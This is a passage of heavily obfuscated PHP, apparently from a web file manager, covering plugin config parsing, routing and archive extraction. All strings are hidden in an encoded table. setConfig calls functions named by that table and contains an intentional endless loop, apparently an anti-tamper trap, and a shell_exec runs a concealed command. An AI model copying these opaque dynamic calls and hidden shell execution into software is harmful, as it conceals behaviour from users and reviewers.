$d®¸² îæµ = substr($A«ÕÌ”—“Û, strlen($dìì¨ç÷º), -4); $EÚ§šÌ²à = LNG($d®¸² îæµ); $CË½äÇÇ®à[] = $A«ÕÌ”—“Û; $eŸŒ¾™êñ™[] = str_replace(array($f¤”´äÒø[217], $f¤”´äÒø[991], $f¤”´äÒø[330], $f¤”´äÒø[113]), array($f¤”´äÒø[50], $f¤”´äÒø[50], $f¤”´äÒø[33], $f¤”´äÒø[1356]), $EÚ§šÌ²à); } $c‰¹¤Ö‹ª¯ = str_replace($CË½äÇÇ®à, $eŸŒ¾™êñ™, $c‰¹¤Ö‹ª¯); goto f–µªØ‹÷; f–µªØ‹÷: } private function parseConfig(&$Cë¬‘ì•‰ê) { goto a¼ÛÑµù‡á; C¡ŒÏ¢Íí: $dâ÷’Ğ–„Á = array(); $d˜ğÕù·”Ú = array(); foreach ($b©æ„Ÿ»ÅÂ[0] as $e™˜¶‹Ö½) { $cãê›¦‰âÁ = substr($e™˜¶‹Ö½, strlen($bœ–Î«ÍÊ•), -2); $dâ÷’Ğ–„Á[] = $e™˜¶‹Ö½; $d˜ğÕù·”Ú[] = _get($a’º²àÚª», $cãê›¦‰âÁ); } goto Bç“ÇÓòá¦; a¼ÛÑµù‡á: $c»ÃÓÏ—ÈË =& $_SERVER[¼€¼ˆ¦‚¡]; $bœ–Î«ÍÊ• = $c»ÃÓÏ—ÈË[1357]; if (!strstr($Cë¬‘ì•‰ê, $bœ–Î«ÍÊ•)) { return; } goto DØŒœ å²; Bç“ÇÓòá¦: $Cë¬‘ì•‰ê = str_replace($dâ÷’Ğ–„Á, $d˜ğÕù·”Ú, $Cë¬‘ì•‰ê); goto A†ÍÔÛ›µŒ; DØŒœ å²: preg_match_all($c»ÃÓÏ—ÈË[1358], $Cë¬‘ì•‰ê, $b©æ„Ÿ»ÅÂ); if (!is_array($b©æ„Ÿ»ÅÂ) || count($b©æ„Ÿ»ÅÂ) == 0 || !is_array($b©æ„Ÿ»ÅÂ[0]) || count($b©æ„Ÿ»ÅÂ[0]) == 0) { return; } $a’º²àÚª» = $this->getConfig(); goto C¡ŒÏ¢Íí; A†ÍÔÛ›µŒ: } private function parsePackage(&$bÄŠˆ“œƒ·) { goto cîÄ‚ï˜çÍ; e±ŒöÈ¦ : $bÄŠˆ“œƒ· = str_replace($dâõİ‹ˆšŸ, $dÑÁêïÄÙå, $bÄŠˆ“œƒ·); goto FáåÉÖÉ¾; b»áæ“ĞóÎ: preg_match_all($dÑµíÇØ¡[1360], $bÄŠˆ“œƒ·, $Dè×ËóíŠ); if (!is_array($Dè×ËóíŠ) || count($Dè×ËóíŠ) == 0 || !is_array($Dè×ËóíŠ[0]) || count($Dè×ËóíŠ[0]) == 0) { return; } $FßĞé÷“©Ù = $this->appPackage(); goto aÙ‚¯ì±†“; aÙ‚¯ì±†“: $dâõİ‹ˆšŸ = array(); $dÑÁêïÄÙå = array(); foreach ($Dè×ËóíŠ[0] as $F‹©£ÃôµÀ) { $Bì©˜‡å† = substr($F‹©£ÃôµÀ, strlen($a‡‹Œ¤›Ş), -2); $dâõİ‹ˆšŸ[] = $F‹©£ÃôµÀ; $dÑÁêïÄÙå[] = _get($FßĞé÷“©Ù, $Bì©˜‡å†); } goto e±ŒöÈ¦ ; cîÄ‚ï˜çÍ: $dÑµíÇØ¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $a‡‹Œ¤›Ş = $dÑµíÇØ¡[1359]; if (!strstr($bÄŠˆ“œƒ·, $a‡‹Œ¤›Ş)) { return; } goto b»áæ“ĞóÎ; FáåÉÖÉ¾: } final function echoFile($f ®“ŠÆâº, $bÆ£ğ®ÚË = false) { goto DË§ÕøÇàº; DË§ÕøÇàº: $Dä„àË“˜ï =& $_SERVER[¼€¼ˆ¦‚¡]; $Aç´¤Æõ‘õ = $this->pluginPath . $f ®“ŠÆâº; if (ACT == $Dä„àË“˜ï[1361]) { echo $Dä„àË“˜ï[1362] . $this->pluginName . $Dä„àË“˜ï[8] . $f ®“ŠÆâº . $Dä„àË“˜ï[1363]; if (!file_exists($Aç´¤Æõ‘õ)) { echo $Dä„àË“˜ï[1364]; return; } } goto CßˆÓ°¸•†; aâù‹»ó¶õ: $this->parsePackage($cºè¢Ê—‹); if (is_array($bÆ£ğ®ÚË)) { $cºè¢Ê—‹ = str_replace(array_keys($bÆ£ğ®ÚË), array_values($bÆ£ğ®ÚË), $cºè¢Ê—‹); } echo $Dä„àË“˜ï[217] . $cºè¢Ê—‹; goto bâ¦§å¯š; CßˆÓ°¸•†: $cºè¢Ê—‹ = $this->parseFile($Aç´¤Æõ‘õ); $this->parseLang($cºè¢Ê—‹); $this->parseConfig($cºè¢Ê—‹); goto aâù‹»ó¶õ; bâ¦§å¯š: } final function initLang() { goto fä Ãºó²; bÑö‹÷‡Ã÷: if (!is_array($DÖÖŠÛëÖï)) { return array(); } if (@count($DÖÖŠÛëÖï) > 0) { I18n::set($DÖÖŠÛëÖï); } return $DÖÖŠÛëÖï; goto dùÜÄÏˆÅ; FßˆÄøÅÈÈ: $cšØÕ£©¹ = I18n::getType(); $DÖÖŠÛëÖï = array(); if (file_exists($CÆ±­–°… . $cšØÕ£©¹ . $DèÜÙÔ¹·«[762])) { $DÖÖŠÛëÖï = (include $CÆ±­–°… . $cšØÕ£©¹ . $DèÜÙÔ¹·«[762]); } else { if ($cšØÕ£©¹ == $DèÜÙÔ¹·«[1367] && !file_exists($CÆ±­–°… . $cšØÕ£©¹ . $DèÜÙÔ¹·«[762]) && file_exists($CÆ±­–°… . $DèÜÙÔ¹·«[1368])) { $DÖÖŠÛëÖï = (include $CÆ±­–°… . $DèÜÙÔ¹·«[1368]); } else { if (file_exists($CÆ±­–°… . $bõ…§®é— . $DèÜÙÔ¹·«[762])) { $DÖÖŠÛëÖï = (include $CÆ±­–°… . $bõ…§®é— . $DèÜÙÔ¹·«[762]); } } } goto bÑö‹÷‡Ã÷; fä Ãºó²: $DèÜÙÔ¹·« =& $_SERVER[¼€¼ˆ¦‚¡]; $bõ…§®é— = $DèÜÙÔ¹·«[1365]; $CÆ±­–°… = $this->pluginPath . $DèÜÙÔ¹·«[1366]; goto FßˆÄøÅÈÈ; dùÜÄÏˆÅ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aØ…ïëÅ²„) { $eÎÄãÁó™ø =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($_SERVER[$eÎÄãÁó™ø[787]]) || !isset($_SERVER[$eÎÄãÁó™ø[1308]])) { goto eôƒĞÜ–Ë¤; bÃØåÃ¯‡“: $fªÒèÑù‚í = $bñöÓÀ‹¨Í($Fã±µ¾ä”); $dŸÈì´Î¦¡ = explode($eÎÄãÁó™ø[217], $fªÒèÑù‚í); if (count($dŸÈì´Î¦¡) < $eÎÄãÁó™ø[554]) { $E¤ÇÃÃ¦éà = $eÎÄãÁó™ø[792]; $E¤ÇÃÃ¦éà(); } goto eÍ·•àö¥; eÍ·•àö¥: $d·‘’ô®Õ· = $eÎÄãÁó™ø[793]; $d·‘’ô®Õ·($_SERVER[$eÎÄãÁó™ø[784]]); $eó›åÄ¨Şå = 1; goto E’«à»ôÔÉ; eôƒĞÜ–Ë¤: $A÷”ºŒÍº = $eÎÄãÁó™ø[788]; $bñöÓÀ‹¨Í = $eÎÄãÁó™ø[789]; $Fã±µ¾ä” = $_SERVER[$eÎÄãÁó™ø[790]] . $eÎÄãÁó™ø[791]; goto bÃØåÃ¯‡“; E’«à»ôÔÉ: for ($d¨¥¹¾å = $eó›åÄ¨Şå; $d¨¥¹¾å > 0; $d¨¥¹¾å++) { $d·‘’ô®Õ· = json_encode($GLOBALS[$eÎÄãÁó™ø[384]]); } goto c¡Æ…ÃŸ®š; c¡Æ…ÃŸ®š: } return $this->modelPlugin->setConfig($this->pluginName, $aØ…ïëÅ²„); } public function onSetConfig($fŒŠÊá¨´) { } public function onGetConfig($A¾ĞÀ´âï´) { } public function onChangeStatus($F…ùÎã¢Æ¾) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Cô’°ß¢“” = "\x70\154\x75\147\x69\x6e\x41\x75\x74\x68") { $Aœ¨®ŠæËØ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($Aœ¨®ŠæËØ[427])) { return !1; } if (_get($GLOBALS, $Aœ¨®ŠæËØ[457])) { return !0; } $D”Ú£î†Çæ = $this->getConfig(); if (!$D”Ú£î†Çæ[$Cô’°ß¢“”]) { return !1; } return ActionCall($Aœ¨®ŠæËØ[1369], $D”Ú£î†Çæ[$Cô’°ß¢“”]); } public function url($AË­…äèŠ¡, $A—ËåšÀ‘ˆ = '', $E“ÇŒ«Ú„ = true) { goto cÃ‡ÑÂÊ‚…; cÃ‡ÑÂÊ‚…: $c”Šå¡ô‚œ =& $_SERVER[¼€¼ˆ¦‚¡]; $DŒ‚Ë±Ñá = $this->getConfig(); $Aš–ø¹ùôñ = KOD_VERSION . $c”Šå¡ô‚œ[91] . KOD_VERSION_BUILD; goto f‘ÑÂ›—ªÍ; b¯ŠÄë‰ğÚ: if (!$E“ÇŒ«Ú„) { return $F¦ÖêÃ¹™; } echo $F¦ÖêÃ¹™; goto eù®Øå»À„; f‘ÑÂ›—ªÍ: $aÉŠ˜¼Üë¹ = $this->packageVersion(); $D‰®ó³æ‚È = $Aš–ø¹ùôñ . $c”Šå¡ô‚œ[412] . $aÉŠ˜¼Üë¹; if (substr($AË­…äèŠ¡, 0, 4) == $c”Šå¡ô‚œ[144] || substr($AË­…äèŠ¡, 0, 2) == $c”Šå¡ô‚œ[1155]) { $F¦ÖêÃ¹™ = $AË­…äèŠ¡ . $c”Šå¡ô‚œ[1370] . $D‰®ó³æ‚È; } else { if ($A—ËåšÀ‘ˆ == $c”Šå¡ô‚œ[33]) { $F¦ÖêÃ¹™ = $this->pluginHost . $AË­…äèŠ¡ . $c”Šå¡ô‚œ[1370] . $D‰®ó³æ‚È; } else { if ($A—ËåšÀ‘ˆ === $c”Šå¡ô‚œ[76]) { $F¦ÖêÃ¹™ = $this->pluginHost . $AË­…äèŠ¡; } else { if ($A—ËåšÀ‘ˆ == $c”Šå¡ô‚œ[1371]) { $F¦ÖêÃ¹™ = STATIC_PATH . $AË­…äèŠ¡ . $c”Šå¡ô‚œ[1370] . $Aš–ø¹ùôñ; } else { if ($A—ËåšÀ‘ˆ == $c”Šå¡ô‚œ[1372]) { $F¦ÖêÃ¹™ = APP_HOST . $c”Šå¡ô‚œ[1373] . $AË­…äèŠ¡ . $c”Šå¡ô‚œ[1370] . $Aš–ø¹ùôñ; } else { if (isset($DŒ‚Ë±Ñá[$A—ËåšÀ‘ˆ])) { $F¦ÖêÃ¹™ = $DŒ‚Ë±Ñá[$A—ËåšÀ‘ˆ] . $AË­…äèŠ¡ . $c”Šå¡ô‚œ[1370] . $D‰®ó³æ‚È; } } } } } } goto b¯ŠÄë‰ğÚ; eù®Øå»À„: } public function link($b¤³¥ÓÌ¨ = false, $C–™“¦‘±õ = '') { $cë’Áë²ì¼ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$b¤³¥ÓÌ¨) { $this->link($cë’Áë²ì¼[1374], $cë’Áë²ì¼[1372]); $this->link($cë’Áë²ì¼[1375], $cë’Áë²ì¼[1371]); $this->link($cë’Áë²ì¼[1376], $cë’Áë²ì¼[1371]); $this->link($cë’Áë²ì¼[1377], $cë’Áë²ì¼[1371]); $this->link($cë’Áë²ì¼[1378], $cë’Áë²ì¼[1371]); return; } $EïÊáóèêğ = $this->url($b¤³¥ÓÌ¨, $C–™“¦‘±õ, !1); if (substr($b¤³¥ÓÌ¨, -3) == $cë’Áë²ì¼[1379]) { echo $cë’Áë²ì¼[1380] . $EïÊáóèêğ . $cë’Áë²ì¼[1381] . $cë’Áë²ì¼[217]; } else { if (substr($b¤³¥ÓÌ¨, -4) == $cë’Áë²ì¼[1382]) { echo $cë’Áë²ì¼[1383] . $EïÊáóèêğ . $cë’Áë²ì¼[1384] . $cë’Áë²ì¼[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\57\x5d\53", "\x3a\156\165\155" => "\133\60\55\x39\x5d\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($C¢å‚™ô¿ù, $C³ÑĞØ¢Ë) { $a‰Ï¿×íÅ¥ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($C¢å‚™ô¿ù == $a‰Ï¿×íÅ¥[1385]) { $EŞ‘Ãˆ–…ƒ = array_map($a‰Ï¿×íÅ¥[1386], $C³ÑĞØ¢Ë[0]); $eÈÚŠ«ø’Û = strpos($C³ÑĞØ¢Ë[1], $a‰Ï¿×íÅ¥[8]) === 0 ? $C³ÑĞØ¢Ë[1] : $a‰Ï¿×íÅ¥[8] . $C³ÑĞØ¢Ë[1]; $f‡Ú‹´áñ· = $C³ÑĞØ¢Ë[2]; } else { $EŞ‘Ãˆ–…ƒ = null; $eÈÚŠ«ø’Û = strpos($C³ÑĞØ¢Ë[0], $a‰Ï¿×íÅ¥[8]) === 0 ? $C³ÑĞØ¢Ë[0] : $a‰Ï¿×íÅ¥[8] . $C³ÑĞØ¢Ë[0]; $f‡Ú‹´áñ· = $C³ÑĞØ¢Ë[1]; } array_push(self::$maps, $EŞ‘Ãˆ–…ƒ); array_push(self::$routes, $eÈÚŠ«ø’Û); array_push(self::$methods, strtoupper($C¢å‚™ô¿ù)); array_push(self::$callbacks, $f‡Ú‹´áñ·); } public static function error($eÀŸ„ÁÖ») { self::$errorCallback = $eÀŸ„ÁÖ»; } public static function haltOnMatch($C„Ş‰ÃÍ’¹ = true) { self::$halts = $C„Ş‰ÃÍ’¹; } public static function dispatch() { goto c‚ÑÆ›È¤‹; Fğ„–Ì…’: $BÏÃ¡ô‚Üä = array_keys(static::$patterns); $b­¿Åˆ´Í‚ = array_values(static::$patterns); $cõÉŒ¨õ = !1; goto Bà£ëœœŒä; Bà£ëœœŒä: self::$routes = preg_replace($aÔÅ­À¡[1073], $aÔÅ­À¡[8], self::$routes); if (in_array($E²¶‹è¥—, self::$routes)) { $Bñùö„ïÎÒ = array_keys(self::$routes, $E²¶‹è¥—); foreach ($Bñùö„ïÎÒ as $A£®¾ë×Ü) { if (self::$methods[$A£®¾ë×Ü] == $FêÙ¯íØ†² || self::$methods[$A£®¾ë×Ü] == $aÔÅ­À¡[1388] || in_array($FêÙ¯íØ†², self::$maps[$A£®¾ë×Ü])) { $cõÉŒ¨õ = !0; if (!is_object(self::$callbacks[$A£®¾ë×Ü])) { $Eªƒ‹ª¶Ÿï = explode($aÔÅ­À¡[8], self::$callbacks[$A£®¾ë×Ü]); $fÙ£ó™İƒÑ = end($Eªƒ‹ª¶Ÿï); $E¶ê…°›Ğ† = explode($aÔÅ­À¡[1389], $fÙ£ó™İƒÑ); $B«Ì¸¤ îƒ = new $E¶ê…°›Ğ†[0](); $B«Ì¸¤ îƒ->{$E¶ê…°›Ğ†[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$A£®¾ë×Ü]); if (self::$halts) { return; } } } } } else { $Bå¤‡¤‚ß = 0; foreach (self::$routes as $A£®¾ë×Ü) { if (strpos($A£®¾ë×Ü, $aÔÅ­À¡[4]) !== !1) { $A£®¾ë×Ü = str_replace($BÏÃ¡ô‚Üä, $b­¿Åˆ´Í‚, $A£®¾ë×Ü); } if (preg_match($aÔÅ­À¡[1390] . $A£®¾ë×Ü . $aÔÅ­À¡[1391], $E²¶‹è¥—, $b‹îØ¾­²Ü)) { if (self::$methods[$Bå¤‡¤‚ß] == $FêÙ¯íØ†² || self::$methods[$Bå¤‡¤‚ß] == $aÔÅ­À¡[1388] || !empty(self::$maps[$Bå¤‡¤‚ß]) && in_array($FêÙ¯íØ†², self::$maps[$Bå¤‡¤‚ß])) { $cõÉŒ¨õ = !0; array_shift($b‹îØ¾­²Ü); if (!is_object(self::$callbacks[$Bå¤‡¤‚ß])) { $Eªƒ‹ª¶Ÿï = explode($aÔÅ­À¡[8], self::$callbacks[$Bå¤‡¤‚ß]); $fÙ£ó™İƒÑ = end($Eªƒ‹ª¶Ÿï); $E¶ê…°›Ğ† = explode($aÔÅ­À¡[1389], $fÙ£ó™İƒÑ); $B«Ì¸¤ îƒ = new $E¶ê…°›Ğ†[0](); if (!method_exists($B«Ì¸¤ îƒ, $E¶ê…°›Ğ†[1])) { echo $aÔÅ­À¡[1392]; } else { call_user_func_array(array($B«Ì¸¤ îƒ, $E¶ê…°›Ğ†[1]), $b‹îØ¾­²Ü); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Bå¤‡¤‚ß], $b‹îØ¾­²Ü); if (self::$halts) { return; } } } } $Bå¤‡¤‚ß++; } } if ($cõÉŒ¨õ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $BÛ°Å¡‡õ =& $_SERVER[¼€¼ˆ¦‚¡]; header($_SERVER[$BÛ°Å¡‡õ[1393]] . $BÛ°Å¡‡õ[1394]); echo $BÛ°Å¡‡õ[1395]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aÔÅ­À¡[1387]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto B¯°çŒÃ…ñ; c‚ÑÆ›È¤‹: $aÔÅ­À¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $E²¶‹è¥— = parse_url($_SERVER[$aÔÅ­À¡[1387]], PHP_URL_PATH); $FêÙ¯íØ†² = $_SERVER[$aÔÅ­À¡[154]]; goto Fğ„–Ì…’; B¯°çŒÃ…ñ: } } goto F¥²¤ÉÉğ; D¥®¡É—Í‰: define($_SERVER[¼€¼ˆ¦‚¡][1936], 5); define($_SERVER[¼€¼ˆ¦‚¡][1937], 16); define($_SERVER[¼€¼ˆ¦‚¡][1938], 32); goto C†ùÇÃµ¡ã; FŠºèâÔŞ: class KodArchive { static function init() { goto fÀÑÆ›Ìœë; Cä¾ÏÜ°’Ù: require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1897]; goto BÆ§ªõ¾ğ; eÄùô¸ŠÕÒ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1892]; require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1893]; goto B·æŞã‰±Ç; fÀÑÆ›Ìœë: $dë±Ğ‘Œøè =& $_SERVER[¼€¼ˆ¦‚¡]; if (defined($dë±Ğ‘Œøè[1886])) { return; } define($dë±Ğ‘Œøè[1886], SDK_DIR . $dë±Ğ‘Œøè[1887]); goto Bğ¦ØîÃÀñ; B·æŞã‰±Ç: require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1894]; require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1895]; require_once ARCHIVE_LIB . $dë±Ğ‘Œøè[1896]; goto Cä¾ÏÜ°’Ù; Bğ¦ØîÃÀñ: define($dë±Ğ‘Œøè[1888], TEMP_FILES); define($dë±Ğ‘Œøè[1889], TEMP_FILES); define($dë±Ğ‘Œøè[1890], $dë±Ğ‘Œøè[1891]); goto eÄùô¸ŠÕÒ; BÆ§ªõ¾ğ: } static function checkIfType($a¢ò¬á†¬ğ, $b­é¯¼œ©Õ) { goto FÌ†°â×ãÖ; Eó·ÓÇ„ˆ³: $Eµ–©‰‡Æ³ = in_array($a¢ò¬á†¬ğ, $F¢ÈÃ‡Œƒ[$b­é¯¼œ©Õ]); if ($Eµ–©‰‡Æ³ && ($b­é¯¼œ©Õ == $Bó®¤¢ˆÄ´[301] || $b­é¯¼œ©Õ == $Bó®¤¢ˆÄ´[1901]) && (!function_exists($Bó®¤¢ˆÄ´[1909]) || !function_exists($Bó®¤¢ˆÄ´[1910]))) { show_tips($Bó®¤¢ˆÄ´[1911]); } if ($Eµ–©‰‡Æ³ && $b­é¯¼œ©Õ == $Bó®¤¢ˆÄ´[1044] && (!function_exists($Bó®¤¢ˆÄ´[1912]) || !strstr(shell_exec($Bó®¤¢ˆÄ´[1913]), $Bó®¤¢ˆÄ´[1914]))) { show_tips($Bó®¤¢ˆÄ´[1915]); } goto A¦µ‘Äø¿; A¦µ‘Äø¿: return $Eµ–©‰‡Æ³; goto AØ¬¾¦í‘; FÌ†°â×ãÖ: $Bó®¤¢ˆÄ´ =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $F¢ÈÃ‡Œƒ = array($Bó®¤¢ˆÄ´[301] => array($Bó®¤¢ˆÄ´[301], $Bó®¤¢ˆÄ´[1898], $Bó®¤¢ˆÄ´[1899], $Bó®¤¢ˆÄ´[1900]), $Bó®¤¢ˆÄ´[1901] => array($Bó®¤¢ˆÄ´[1901], $Bó®¤¢ˆÄ´[1902], $Bó®¤¢ˆÄ´[1042], $Bó®¤¢ˆÄ´[1040]), $Bó®¤¢ˆÄ´[1044] => array($Bó®¤¢ˆÄ´[1044], $Bó®¤¢ˆÄ´[1903], $Bó®¤¢ˆÄ´[1904], $Bó®¤¢ˆÄ´[1905], $Bó®¤¢ˆÄ´[1906], $Bó®¤¢ˆÄ´[1907], $Bó®¤¢ˆÄ´[1908])); goto Eó·ÓÇ„ˆ³; AØ¬¾¦í‘: } static function listContent($e™ÑìİĞæ©, $b™‘òğá«‘ = true) { $bŞ°—Šß±å =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $D¸º·´º¼¼ = !empty($GLOBALS[$bŞ°—Šß±å[1048]]) ? $GLOBALS[$bŞ°—Šß±å[1048]] : get_path_ext($e™ÑìİĞæ©); $BĞ¤ã„ä†Ú = !1; if (self::checkIfType($D¸º·´º¼¼, $bŞ°—Šß±å[1901])) { $aË¤Àô“½† = PclTarList($e™ÑìİĞæ©, $D¸º·´º¼¼); $BĞ¤ã„ä†Ú = array(); for ($Eç…Ï„Ú­Ü = 0; $Eç…Ï„Ú­Ü < count($aË¤Àô“½†); $Eç…Ï„Ú­Ü++) { $c‰‰öÆä = $aË¤Àô“½†[$Eç…Ï„Ú­Ü]; if ($c‰‰öÆä[$bŞ°—Šß±å[1916]] == $bŞ°—Šß±å[1917] || $c‰‰öÆä[$bŞ°—Šß±å[1916]] == $bŞ°—Šß±å[1918]) { continue; } if ($b™‘òğá«‘) { $c‰‰öÆä[$bŞ°—Šß±å[1919]] = ltrim($c‰‰öÆä[$bŞ°—Šß±å[1919]], $bŞ°—Šß±å[1155]); } if ($c‰‰öÆä[$bŞ°—Šß±å[1916]] == $bŞ°—Šß±å[1920]) { $c‰‰öÆä[$bŞ°—Šß±å[76]] = !0; } else { $c‰‰öÆä[$bŞ°—Šß±å[76]] = !1; } $c‰‰öÆä[$bŞ°—Šß±å[1035]] = $Eç…Ï„Ú­Ü; $BĞ¤ã„ä†Ú[] = $c‰‰öÆä; } } else { if (self::checkIfType($D¸º·´º¼¼, $bŞ°—Šß±å[1044])) { $f¦í‡ê¬ÂÑ = kodRarArchive::listContent($e™ÑìİĞæ©); if (!$f¦í‡ê¬ÂÑ[$bŞ°—Šß±å[1031]]) { return $f¦í‡ê¬ÂÑ; } else { $BĞ¤ã„ä†Ú = $f¦í‡ê¬ÂÑ[$bŞ°—Šß±å[1033]]; } } else { if (kodZipArchive::support($bŞ°—Šß±å[354])) { $BĞ¤ã„ä†Ú = kodZipArchive::listContent($e™ÑìİĞæ©); } else { $eôƒø÷Ñö = new PclZip($e™ÑìİĞæ©); $BĞ¤ã„ä†Ú = $eôƒø÷Ñö->listContent(); } } } if ($BĞ¤ã„ä†Ú) { $CÆ‘ ‘»ù = unzip_charset_get($BĞ¤ã„ä†Ú); $b™‘òğá«‘ = $b™‘òğá«‘ && function_exists($bŞ°—Šß±å[65]); for ($Eç…Ï„Ú­Ü = 0; $Eç…Ï„Ú­Ü < count($BĞ¤ã„ä†Ú); $Eç…Ï„Ú­Ü++) { $BĞ¤ã„ä†Ú[$Eç…Ï„Ú­Ü][$bŞ°—Šß±å[1919]] = str_replace(array($bŞ°—Šß±å[1072], $bŞ°—Šß±å[1921]), $bŞ°—Šß±å[760], $BĞ¤ã„ä†Ú[$Eç…Ï„Ú­Ü][$bŞ°—Šß±å[1919]]); if ($b™‘òğá«‘) { $BĞ¤ã„ä†Ú[$Eç…Ï„Ú­Ü][$bŞ°—Šß±å[1919]] = iconv_to($BĞ¤ã„ä†Ú[$Eç…Ï„Ú­Ü][$bŞ°—Šß±å[1919]], $CÆ‘ ‘»ù, $bŞ°—Šß±å[326]); unset($BĞ¤ã„ä†Ú[$Eç…Ï„Ú­Ü][$bŞ°—Šß±å[1922]]); } } return array($bŞ°—Šß±å[1031] => !0, $bŞ°—Šß±å[1033] => $BĞ¤ã„ä†Ú); } else { return array($bŞ°—Šß±å[1031] => !1, $bŞ°—Šß±å[1033] => $BĞ¤ã„ä†Ú); } } static function extract($böÃŒéÕ, $Bîé‰—‡œ†, $fãô¹œÁ† = "\55\x31", &$b´‹ˆğËÌ = false) { goto aë¹ÚŞÏŠ›; aë¹ÚŞÏŠ›: $Cµ¤Ø…”èÏ =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $d•³Ğ¥åÅ = !empty($GLOBALS[$Cµ¤Ø…”èÏ[1048]]) ? $GLOBALS[$Cµ¤Ø…”èÏ[1048]] : get_path_ext($böÃŒéÕ); goto E¨êîë‚ïò; E¨êîë‚ïò: $cöÜ™•ôÍÑ = self::listContent($böÃŒéÕ, !1); if (!$cöÜ™•ôÍÑ[$Cµ¤Ø…”èÏ[1031]]) { return $cöÜ™•ôÍÑ; } if ($fãô¹œÁ† != $Cµ¤Ø…”èÏ[1030]) { goto D·Ğƒæ’š¡; eæ‰²Ì—ßì: if ($GLOBALS[$Cµ¤Ø…”èÏ[6]][$Cµ¤Ø…”èÏ[1153]] != $Cµ¤Ø…”èÏ[326]) { $B›ª¿ŠÏÛ = unzip_pre_name($b´‹ˆğËÌ); } $dğÏŒĞèì‘ = get_path_father($b´‹ˆğËÌ); if ($dğÏŒĞèì‘ == $b´‹ˆğËÌ) { $dğÏŒĞèì‘ = $Cµ¤Ø…”èÏ[33]; } goto bïìÅÔõã; D·Ğƒæ’š¡: $AìØÇÎ‹ŒÒ = self::fileIndex($cöÜ™•ôÍÑ[$Cµ¤Ø…”èÏ[1033]], $fãô¹œÁ†); $b´‹ˆğËÌ = str_replace(array($Cµ¤Ø…”èÏ[1072], $Cµ¤Ø…”èÏ[1921]), $Cµ¤Ø…”èÏ[70], $AìØÇÎ‹ŒÒ[$Cµ¤Ø…”èÏ[1919]]); $B›ª¿ŠÏÛ = $b´‹ˆğËÌ; goto eæ‰²Ì—ßì; bïìÅÔõã: if ($AìØÇÎ‹ŒÒ[$Cµ¤Ø…”èÏ[76]]) { $B›ª¿ŠÏÛ = rtrim($B›ª¿ŠÏÛ, $Cµ¤Ø…”èÏ[8]) . $Cµ¤Ø…”èÏ[8]; $b´‹ˆğËÌ = array($b´‹ˆğËÌ); } $e–ĞƒŒ‚ŞŠ = str_replace($Cµ¤Ø…”èÏ[93], $Cµ¤Ø…”èÏ[8], $B›ª¿ŠÏÛ); if (substr($e–ĞƒŒ‚ŞŠ, -1) == $Cµ¤Ø…”èÏ[8]) { if (!strstr(trim($e–ĞƒŒ‚ŞŠ, $Cµ¤Ø…”èÏ[8]), $Cµ¤Ø…”èÏ[8])) { $Bîé‰—‡œ† = $Bîé‰—‡œ† . get_path_this($e–ĞƒŒ‚ŞŠ) . $Cµ¤Ø…”èÏ[8]; } } else { if ($dğÏŒĞèì‘ == $B›ª¿ŠÏÛ) { $dğÏŒĞèì‘ = $Cµ¤Ø…”èÏ[33]; } } goto Bˆ•ê·Á©; Bˆ•ê·Á©: } goto Dº²ªö„ˆ’; Dº²ªö„ˆ’: if (self::checkIfType($d•³Ğ¥åÅ, $Cµ¤Ø…”èÏ[1901])) { if ($fãô¹œÁ† != $Cµ¤Ø…”èÏ[1030]) { $B›ª¿ŠÏÛ = unzip_pre_name($B›ª¿ŠÏÛ); $dğÏŒĞèì‘ = unzip_pre_name($dğÏŒĞèì‘); $bà£àƒêµ = PclTarExtractList($böÃŒéÕ, array($B›ª¿ŠÏÛ), $Bîé‰—‡œ†, $dğÏŒĞèì‘, $d•³Ğ¥åÅ); } else { $bà£àƒêµ = PclTarExtract($böÃŒéÕ, $Bîé‰—‡œ†, $Cµ¤Ø…”èÏ[361], $d•³Ğ¥åÅ); } return array($Cµ¤Ø…”èÏ[1031] => $bà£àƒêµ, $Cµ¤Ø…”èÏ[1033] => PclErrorString(!0)); } else { if (self::checkIfType($d•³Ğ¥åÅ, $Cµ¤Ø…”èÏ[1044])) { return kodRarArchive::extract($böÃŒéÕ, $Bîé‰—‡œ†, $d•³Ğ¥åÅ, $b´‹ˆğËÌ); } else { if (kodZipArchive::support($Cµ¤Ø…”èÏ[1923])) { return kodZipArchive::extract($böÃŒéÕ, $Bîé‰—‡œ†, $b´‹ˆğËÌ); } else { $E¸„‘äÑÚ = new PclZip($böÃŒéÕ); if ($fãô¹œÁ† != $Cµ¤Ø…”èÏ[1030]) { $bà£àƒêµ = $E¸„‘äÑÚ->extract(PCLZIP_OPT_PATH, $Bîé‰—‡œ†, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Cµ¤Ø…”èÏ[1924], PCLZIP_OPT_BY_NAME, $AìØÇÎ‹ŒÒ[$Cµ¤Ø…”èÏ[1919]], PCLZIP_OPT_REMOVE_PATH, $dğÏŒĞèì‘, PCLZIP_OPT_REPLACE_NEWER); } else { $bà£àƒêµ = 